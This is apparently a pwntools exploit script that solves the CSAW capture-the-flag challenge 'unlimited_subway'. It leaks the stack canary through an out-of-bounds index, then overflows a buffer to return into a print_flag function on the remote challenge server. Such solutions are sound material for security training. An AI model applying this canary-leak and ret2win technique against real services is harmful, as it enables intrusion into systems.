from pwn import *
elf = context.binary = ELF("./unlimited_subway")
libc = elf.libc
r = elf.process()
r = remote("pwn.csaw.io", 7900)

# gdb.attach(r, '''
#     b* main+500\n
#     c
# ''')

def view_stack(idx):
    r.sendline(b"V")
    r.sendline(str(idx))

# Leak Libc & canary(131,130,129,128)
canary = b""
view_stack(131)
r.recvuntil(b"Index 131 : ")
canary += r.recv(2)
view_stack(130)
r.recvuntil(b"Index 130 : ")
canary += r.recv(2)
view_stack(129)
r.recvuntil(b"Index 129 : ")
canary += r.recv(2)
view_stack(128)
r.recvuntil(b"Index 128 : ")
canary += r.recv(2)
canary = int(canary,16)
log.success(f"LIBC: {hex(canary)}")

# Ret2win
r.sendline(b"E")
r.sendline(str(0x50))
payload = b"a" * 0x40 + p32(canary) + p32(0x0) + p32(elf.sym["print_flag"])
r.sendline(payload)
r.interactive()